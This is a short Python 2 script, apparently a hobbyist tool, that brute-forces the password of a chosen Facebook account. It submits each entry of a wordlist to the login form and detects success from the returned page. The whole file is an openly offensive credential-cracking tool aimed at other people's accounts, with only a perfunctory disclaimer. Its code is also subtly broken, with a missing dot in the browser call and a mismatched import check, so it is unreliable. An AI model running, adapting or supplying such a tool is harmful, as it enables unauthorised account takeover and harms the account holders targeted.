#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
        #############################################
        #                                           #
        #    Facebook BruteForce, by adii Aadil     #
        #    Facebook Contact:       adiil.         #
        #                                           #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import requests
except ImportError:
        os.system('pip2 install mechanize') 
        exit () 
time.sleep(0.5)
user = raw_input('[💀] Target Username/ID/Email >>?? ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[💀] Wordlist Type pk.txt >> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
print '\nIM NOT RESPONSIBLE FOR ANY MISS USE Aahil\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize Browser() 
            browser.set_handle_robots(False)
            browser.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36' )]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password Found > '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Wrong Password! > "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'Sorry, none of the passswords in your wordlist is right.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
